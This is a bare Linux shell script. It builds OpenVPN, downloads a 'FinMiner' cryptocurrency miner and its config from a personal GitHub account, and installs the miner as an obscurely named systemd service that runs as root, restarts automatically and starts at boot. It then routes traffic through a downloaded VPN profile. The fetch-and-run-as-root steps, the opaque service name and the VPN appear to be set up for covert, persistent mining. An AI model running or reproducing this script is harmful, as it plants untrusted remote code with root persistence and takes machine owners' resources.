sudo apt-get update 
sudo apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git liblzo2-dev libpam0g-dev
wget https://swupdate.openvpn.org/community/releases/openvpn-2.4.6.tar.gz
tar -xf openvpn-2.4.6.tar.gz
cd openvpn-2.4.6
./configure
make
make install
cd /usr/local/
wget https://github.com/greggarbacz8/finn/releases/download/2.4.1/FinMiner-test.tar.gz
wget https://raw.githubusercontent.com/greggarbacz8/plugins/master/Scripts/sml4/config.ini
wget https://raw.githubusercontent.com/greggarbacz8/plugins/master/Scripts/client3.ovpn
wget https://raw.githubusercontent.com/greggarbacz8/plugins/master/Scripts/update-resolv-conf
chmod +x *
tar -xf FinMiner-test.tar.gz
bash -c 'cat <<EOT >>/lib/systemd/system/1tieuthanhtrum.service 
[Unit]
Description=1tieuthanhtrum
After=network.target
[Service]
ExecStart=  /usr/local/FinMiner-linux-2.4.2/finminer /usr/local/config.ini
WatchdogSec=600
Restart=always
RestartSec=30
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable 1tieuthanhtrum.service
service 1tieuthanhtrum start && openvpn --config /usr/local/client3.ovpn 
